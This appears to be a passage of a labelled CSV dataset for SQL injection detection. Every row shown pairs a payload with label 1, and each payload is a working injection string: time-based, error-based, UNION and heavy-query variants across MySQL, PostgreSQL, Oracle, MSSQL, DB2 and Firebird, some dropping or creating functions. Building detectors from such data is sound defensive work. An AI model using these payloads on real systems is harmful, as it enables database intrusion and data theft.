,payload,label
26700,"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""vjvz"" like ""vjvz",1
26701,"1"") or sleep(5) and (""fiag"" like ""fiag",1
26702,"1',(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))",1
26703,"-2009%' union all select 1991,1991#",1
26704,"1"") where 3507=3507;select benchmark(5000000,md5(0x4c4d6142))--",1
26705,1') and 2577=7094,1
26706,1' and 5835=6157 and 'bjee' like 'bjee,1
26707,"1%""));select benchmark(5000000,md5(0x714e4153))#",1
26708,"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",1
26709,"1)) as nxdf where 1696=1696 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
26710,"1%' union all select null,null,null,null,null,null,null--",1
26711,1')) as dqdv where 8126=8126 and 4595=4595#,1
26712,"1') where 7093=7093 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
26713,"1"" and make_set(8262=3471,3471) and ""wayp""=""wayp",1
26714,"1"")) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
26715,"-2610%"") union all select 7779,7779,7779,7779,7779--",1
26716,"1%')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
26717,"1'||(select 'uyfo' where 1236=1236 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",1
26718,-7565') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('gymz'='gymz,1
26719,"1%"") and 8024=3560--",1
26720,"1%"")));if(7899=7899) select 7899 else drop function zbbp--",1
26721,-2869')) union all select 3216--,1
26722,"1',(select (case when (1570=1570) then (select 1570 from pg_sleep(5)) else 1/(select 0) end))",1
26723,"1"") as bllz where 6975=6975 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
26724,"1' in boolean mode) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",1
26725,"1'))) union all select null,null,null,null,null,null--",1
26726,-3895') or 8645=5359--,1
26727,"1%"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
26728,1) and 7533=7533,1
26729,"1%""))) or sleep(5) and (((""%""=""",1
26730,1%' and 2006=2006,1
26731,1 rlike (select (case when (7689=7689) then 1 else 0x28 end)),1
26732,"1"") where 4878=4878 and (select * from (select(sleep(5)))fzno)--",1
26733,"-6305""))) or 8097=2048 and (((""euyy"" like ""euyy",1
26734,"1"") where 9545=9545 and 9198=9198--",1
26735,"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""jcgh""=""jcgh",1
26736,"1',extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))",1
26737,"1))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((5199=5199",1
26738,-3125'))) order by 1#,1
26739,1' in boolean mode);waitfor delay '0:0:5'#,1
26740,"-5417 or elt(1032=1032,3623)",1
26741,"1)) as zykv where 2158=2158;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
26742,"1)) as xvyi where 6701=6701 union all select null,null,null,null#",1
26743,"1'+(select 'jfir' where 7814=7814 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",1
26744,"-7860'))) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1
26745,1'||(select 'lxyu' from dual where 5789=5789 union all select null#,1
26746,"1') where 3375=3375 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
26747,"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('xiyl' like 'xiyl",1
26748,"1' where 3028=3028;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
26749,"1' where 7036=7036;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
26750,"1') as vmmk where 5757=5757 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
26751,"-1510'))) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
26752,1'+(select 'ymgm' where 8204=8204 and sleep(5)#,1
26753,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",1
26754,"1%');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('%'='",1
26755,"1"") where 8702=8702 union all select null,null,null,null,null--",1
26756,"-4205') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1
26757,"1""));begin user_lock.sleep(5); end and ((""kvts"" like ""kvts",1
26758,"1'||(select 'kgfu' from dual where 2607=2607 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
26759,1' where 6003=6003 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,1
26760,"-9871"") union all select 9082#",1
26761,1);waitfor delay '0:0:5'--,1
26762,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",1
26763,1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('jryo'='jryo,1
26764,1') and 9198=9198--,1
26765,"-9958"") as jzvq where 3741=3741 union all select 3741,3741,3741#",1
26766,"-3952') union all select 6644,6644,6644--",1
26767,"1%"" rlike (select * from (select(sleep(5)))vwyq)#",1
26768,1')) and (select * from (select(sleep(5)))fzno) and (('wevl'='wevl,1
26769,1));if(7899=7899) select 7899 else drop function zbbp--,1
26770,"1%'))) union all select null,null,null,null,null,null,null,null,null#",1
26771,"-4256') where 9545=9545 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
26772,"-3393"")) union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",1
26773,"1"") or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
26774,1' where 8482=8482 or sleep(5)#,1
26775,"1%';iif(5257=5257,1,1/0)",1
26776,"1'+(select 'mxei' where 7811=7811 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
26777,"1"") as ypfa where 6128=6128;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
26778,-3450' where 4478=4478 or 9323=9323#,1
26779,-8057')) as gpue where 4205=4205 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
26780,"1') union all select null,null,null,null,null,null,null,null,null,null--",1
26781,"-5672%"" or 3825=9675--",1
26782,1' or 4240=(select 4240 from pg_sleep(5))--,1
26783,"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""msjh"" like ""msjh",1
26784,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1
26785,1%'));select (case when (4006=1276) then 1 else 4006*(select 4006 from master..sysdatabases) end)--,1
26786,"1'||(select 'nbmo' from dual where 5572=5572 and 8635=(select count(*) from generate_series(1,5000000))--",1
26787,"1"") and (3020=3020)*6703 and (""hkjf""=""hkjf",1
26788,"1') as oknw where 8777=8777;iif(4836=1823,1,1/0)",1
26789,"1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('akyc'='akyc",1
26790,(select (case when (3950=2747) then 1 else 1/(select 0) end)),1
26791,1) where 6039=6039 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
26792,-9555'))) or (8459=8459)*4906 and ((('rwpq' like 'rwpq,1
26793,"1') as ssez where 5351=5351 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
26794,"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)# aetd",1
26795,"1) where 3915=3915 union all select null,null,null,null#",1
26796,"-3979' in boolean mode) union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",1
26797,"1"") where 9648=9648 and elt(1210=1210,sleep(5))--",1
26798,"1) union all select null,null,null,null,null,null,null,null--",1
26799,"-7323%"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",1
26800,"1'||(select 'sned' where 4957=4957 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
26801,"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('zpzf'='zpzf",1
26802,"1%"") or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
26803,1%' rlike (select * from (select(sleep(5)))sgvo) and '%'=',1
26804,1%'))) and (select * from (select(sleep(5)))fzno) and ((('%'=',1
26805,"1"") as tnux where 4888=4888 rlike (select * from (select(sleep(5)))vwyq)#",1
26806,"1') as ezoa where 4915=4915 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
26807,"1 where 8273=8273 union all select null,null,null,null,null,null,null,null#",1
26808,"1));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
26809,"1%""))) or 4240=(select 4240 from pg_sleep(5))--",1
26810,1'+(select ahyw where 6893=6893 waitfor delay '0:0:5'--,1
26811,"1"");select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
26812,"-1040 where 3058=3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",1
26813,1' or sleep(5) and 'yudo'='yudo,1
26814,"1' union all select null,null,null,null#",1
26815,"-2448%"") or 3038=3038",1
26816,1'+(select 'uetb' where 6468=6468;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
26817,"-5225')) as zats where 5629=5629 union all select 5629,5629,5629,5629,5629--",1
26818,"1'||(select 'jzwq' where 3289=3289 union all select null,null,null,null,null,null,null#",1
26819,"-8477' union all select 2517,2517,2517--",1
26820,"1%"")) union all select null,null#",1
26821,-7230') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('khtc'='khtc,1
26822,"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""qqfd"" like ""qqfd",1
26823,"1') as znak where 5203=5203;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
26824,"-4970') union all select 4625,4625,4625,4625,4625,4625,4625,4625#",1
26825,"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
26826,1) where 4780=4780;begin dbms_lock.sleep(5); end--,1
26827,"1')) as qzyp where 5081=5081 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",1
26828,1%' and (select * from (select(sleep(5)))fzno) and '%'=',1
26829,"1') where 9091=9091 union all select null,null,null,null#",1
26830,"1) where 6340=6340 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1
26831,"1%';iif(6369=5881,1,1/0)",1
26832,1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('mfmk'='mfmk,1
26833,"1'qhfy<'"">utwq",1
26834,"1%'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
26835,"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
26836,"1'+(select immd where 7499=7499 union all select null,null,null,null,null,null,null,null#",1
26837,1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'),1
26838,"-9031%"") order by 1--",1
26839,"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'ozur'='ozur",1
26840,1'))) and 6969=(select 6969 from pg_sleep(5)) and ((('ineq' like 'ineq,1
26841,"1 where 7642=7642 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",1
26842,"-3007) where 6648=6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",1
26843,"1%"";select case when 7717=7717 then 1 else null end--",1
26844,1%'))) and 8594=(select 8594 from pg_sleep(5))--,1
26845,"1"" where 2452=2452;select sleep(5)#",1
26846,"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'wwwb'='wwwb",1
26847,-9327') or 3038=3038,1
26848,"-3035"") union all select 7912,7912,7912#",1
26849,"1'));select benchmark(5000000,md5(0x714e4153))#",1
26850,1%')) or 6793=(select 6793 from pg_sleep(5)) and (('%'=',1
26851,"1"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""kndm""=""kndm",1
26852,1'))) order by 1#,1
26853,1 where 8966=8966;if(1087=5839) select 1087 else drop function zzeh--,1
26854,"-7088'||(select 'arol' from dual where 8891=8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",1
26855,"-2054%""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",1
26856,1'+(select 'xqjx' where 7048=7048 and 9198=9198--,1
26857,"1"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
26858,"1%';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",1
26859,"1'+(select 'ggkm' where 3394=3394;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
26860,1) as fhvb where 4008=4008;begin user_lock.sleep(5); end--,1
26861,"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('swjk'='swjk",1
26862,"1')) as anaq where 9605=9605 and elt(4249=4249,7259)--",1
26863,"1') or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
26864,"1'))) union all select null,null,null,null#",1
26865,1)) and 9198=9198--,1
26866,"1%"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",1
26867,"1%""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
26868,"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",1
26869,"1"") where 7957=7957 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
26870,"1%"") and 2388=benchmark(5000000,md5(0x6d457153))#",1
26871,"-6659') where 1256=1256 union all select 1256,1256--",1
26872,-2050' union all select 5606#,1
26873,"1%"");select case when 7717=7717 then 1 else null end--",1
26874,1' in boolean mode) or 6793=(select 6793 from pg_sleep(5))#,1
26875,"-8256""))) or 6872=6872 and (((""lrtu""=""lrtu",1
26876,"1'||(select 'mwmn' where 5112=5112 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'",1
26877,"1"")));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",1
26878,"1) as wuio where 5312=5312 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
26879,"1"")) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
26880,"1"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""cdnc"" like ""cdnc",1
26881,"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""khuw"" like ""khuw",1
26882,"1%') union all select null,null,null,null,null,null,null#",1
26883,"1%') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('%'='",1
26884,1' or 6793=(select 6793 from pg_sleep(5)) and 'hokd'='hokd,1
26885,"1"" where 1537=1537 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
26886,"1%"");begin dbms_lock.sleep(5); end--",1
26887,"1'||(select 'ycya' from dual where 3536=3536 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
26888,"1"") as wvxt where 7321=7321 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
